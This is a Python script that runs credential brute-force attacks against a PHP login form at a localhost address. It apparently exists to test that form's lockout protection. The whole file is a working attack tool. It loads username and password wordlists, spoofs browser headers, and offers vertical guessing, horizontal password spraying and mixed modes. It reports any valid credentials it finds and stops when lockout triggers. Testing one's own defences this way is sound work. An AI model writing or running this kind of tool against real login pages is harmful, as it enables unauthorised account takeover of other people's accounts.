import requests
import time

# Define color codes
GREEN = "\033[32m"
RED = "\033[31m"
YELLOW = "\033[33m"
RESET = "\033[0m"
BLUE = "\033[34m"
PURPLE = "\033[35m"
ORANGE = "\033[38;5;214m"


# URL for login
LOGIN_URL = 'http://localhost/blockbruteforce/login.php'

# Load username and password lists
try:
    with open('usernames.txt', 'r') as file:
        usernames = [line.strip() for line in file.readlines()]

    with open('passwords.txt', 'r') as file:
        passwords = [line.strip() for line in file.readlines()]
except FileNotFoundError as e:
    print(f"Error: {e}")
    exit(1)


def get_new_session():
    """Retrieve a new session by making a GET request to the login page."""
    with requests.Session() as session:
        response = session.get(LOGIN_URL)
        if 'Set-Cookie' in response.headers:
            print(f"{GREEN}[INFO]{RESET} New session cookie obtained.")
            return session  # The session now contains the PHPSESSID cookie
        else:
            print("[ERROR] Failed to obtain session cookie.")
            exit(1)


def attempt_login(session, username, password):
    """Attempt to login with given username and password."""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Referer': LOGIN_URL  # Referer header to mimic browser behavior
    }

    login_data = {
        'username': username,
        'password': password
    }

    # Perform the login request
    response = session.post(LOGIN_URL, data=login_data, headers=headers, allow_redirects=False)

    # Check if the account is locked or too many attempts
    if response.status_code == 403:
        return False, response

    # Check for successful login (by checking for the redirect to dashboard)
    if response.status_code == 302 and "Location" in response.headers and response.headers["Location"] == "dashboard.php":
        return True, response

    # If the credentials are invalid
    if response.status_code == 200:
        return False, response

    # Handle other status codes if needed
    print(f"{YELLOW}[INFO]{RESET} Status Code: {response.status_code}")
    return False, response



def vertical_brute_force(single_username, sleep_time):
    """Perform vertical brute-force attack for a single user."""
    failed_attempts = 0

    session = get_new_session()  # Obtain a new session

    for password in passwords:
        success, response = attempt_login(session, single_username, password)

        if success:
            print(f"{GREEN}[SUCCESS]{RESET} Login successful for username: {single_username}, Password: {password}")
            return
        else:
            print(f"{RED}[FAIL]{RESET} Invalid credentials for {single_username}. Password: {password}")
            failed_attempts += 1

        # Stop if brute-force protection activates
        if response.status_code == 403 or "too many attempts" in response.text.lower():
            print(f"{RED}[BLOCKED]{RESET} Brute-force prevention detected after {failed_attempts} attempts.")
            print(f"{RED}[BLOCKED]{RESET} Account {single_username} locked for 2 minutes.")
            break

        time.sleep(sleep_time)


def horizontal_attack(sleep_time):
    """Perform horizontal brute-force attack (one password across all users)."""
    failed_attempts = 0

    session = get_new_session()  # Obtain a new session

    for password in passwords:
        print(f"{YELLOW}[INFO]{RESET} Attempting Password: {password} across all users")

        for username in usernames:
            success, response = attempt_login(session, username, password)

            if success:
                print(f"{GREEN}[SUCCESS]{RESET} Login successful for username: {username}, Password: {password}")
                return
            elif "Invalid credentials" in response.text:
                print(f"{RED}[FAIL]{RESET} Invalid credentials for {username}, Password: {password}")
                failed_attempts += 1
            else:
                print(f"{YELLOW}[INFO]{RESET} Response: {response.status_code}")

            if response.status_code == 403 or "too many attempts" in response.text.lower():
                print(f"{RED}[BLOCKED]{RESET} Brute-force prevention detected after {failed_attempts} attempts.")
                print(f"{RED}[BLOCKED]{RESET} Account locked for 2 minutes.")
                return

            time.sleep(sleep_time)


def mixed_attack(sleep_time):
    """Perform mixed brute-force attack."""
    session = get_new_session()  # Obtain a new session

    for username in usernames:
        print(f"{YELLOW}[INFO]{RESET} Testing passwords for Username: {username}")
        failed_attempts = 0

        for password in passwords:
            success, response = attempt_login(session, username, password)

            if success:
                print(f"{GREEN}[SUCCESS]{RESET} Login successful for username: {username}, Password: {password}")
                return
            else:
                print(f"{RED}[FAIL]{RESET} Invalid credentials for {username}, Password: {password}")
                failed_attempts += 1
            
            if response.status_code == 403 or "too many attempts" in response.text.lower():
                print(f"{RED}[BLOCKED]{RESET} Brute-force prevention triggered after {failed_attempts} attempts.")
                print(f"{RED}[BLOCKED]{RESET} Account {username} locked for 2 minutes.")
                break

            time.sleep(sleep_time)


# Choose attack type
try:
    sleep_time = float(input("Enter sleep time between requests (in seconds, e.g., 1.5): "))
except ValueError:
    print("Invalid input. Using default sleep time of 1 second.")
    sleep_time = 1.0

print(f"Select attack type: \n1. {BLUE}Vertical{RESET} (multiple passwords, single user)\n2. {PURPLE}Horizontal{RESET} (single password, multiple users)\n3. {ORANGE}Mixed{RESET} (multiple passwords, all users)")
choice = input("Enter choice (1, 2, or 3): ")

if choice == "1":
    print(f"{BLUE}Vertical{RESET} attack chosen")
    target_username = input("Enter the username for vertical brute-force: ")
    vertical_brute_force(target_username, sleep_time)
elif choice == "2":
    print(f"{PURPLE}Horizontal{RESET} attack chosen")
    horizontal_attack(sleep_time)
elif choice == "3":
    print(f"{ORANGE}Mixed{RESET} attack chosen")
    mixed_attack(sleep_time)
else:
    print("Invalid choice.")
